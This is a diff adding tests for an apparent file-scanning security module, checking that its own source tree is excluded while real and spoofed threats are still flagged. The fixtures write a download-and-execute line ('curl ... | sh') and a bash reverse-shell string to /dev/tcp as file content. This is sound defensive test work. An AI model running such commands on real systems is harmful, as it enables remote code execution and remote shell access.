@@ -393,6 +393,54 @@ def test_gate_open_holds_a_file_whose_scan_errored():
         _reset_gate_state()
 
 
+def _make_ember_tree(marker: bool = True) -> Path:
+    """A folder that fingerprints as an Ember source tree (checkout / copy), with files that
+    would otherwise be flagged (a security module's IOC strings + an executable script)."""
+    import tempfile as _tf
+    d = Path(_tf.mkdtemp(prefix="ember_tree_")) / "Ember"
+    d.mkdir()
+    (d / "agent.py").write_text("# agent\n")
+    (d / "antivirus.py").write_text("# security module (contains IOC strings)\n")
+    (d / "version.py").write_text('__version__="1"\n' + ('GITHUB_REPO = "EmberAI"\n' if marker else ""))
+    (d / "install.sh").write_text("#!/bin/bash\ncurl http://x | sh\n")           # download-exec + .sh
+    (d / "test_fileless_guard.py").write_text("x = 'bash -i >& /dev/tcp/1.2.3.4/9'\n")  # reverse-shell
+    return d
+
+
+def test_ember_source_tree_is_skipped_even_when_not_the_running_dir():
+    # The bug: a scan of Ember's OWN code (a checkout/copy, not the running install) flagged its
+    # security modules + tests as malware. An Ember tree must be recognised by its fingerprint
+    # wherever it lives and skipped entirely.
+    antivirus._EMBER_TREE_CACHE.clear()
+    tree = _make_ember_tree()
+    assert antivirus._is_ember_own(tree / "install.sh") is True
+    assert antivirus._is_ember_own(tree / "test_fileless_guard.py") is True
+    r = antivirus.scan_directory(str(tree), deep=False)
+    assert r["ok"] and r["flagged_count"] == 0 and r["scanned"] == 0, r
+
+
+def test_real_threats_outside_ember_are_still_caught():
+    # The exclusion must not become a blanket bypass: the SAME nasty file in an ordinary folder
+    # is still flagged.
+    antivirus._EMBER_TREE_CACHE.clear()
+    import tempfile as _tf
+    d = Path(_tf.mkdtemp(prefix="downloads_"))
+    (d / "install.sh").write_text("#!/bin/bash\ncurl http://x | sh\n")
+    assert antivirus._is_ember_own(d / "install.sh") is False
+    r = antivirus.scan_directory(str(d), deep=False)
+    assert r["scanned"] == 1 and r["flagged_count"] >= 1, r
+
+
+def test_spoofed_ember_tree_is_not_trusted():
+    # A folder that merely has files NAMED like Ember's but without the version.py marker must not
+    # be trusted (so malware can't cloak itself by dropping an agent.py/antivirus.py).
+    antivirus._EMBER_TREE_CACHE.clear()
+    spoof = _make_ember_tree(marker=False)
+    assert antivirus._is_ember_own(spoof / "install.sh") is False
+    r = antivirus.scan_directory(str(spoof), deep=False)
+    assert r["flagged_count"] >= 1, r
+
+
 def _run_all() -> bool:
     import types
     funcs = [v for k, v in sorted(globals().items())
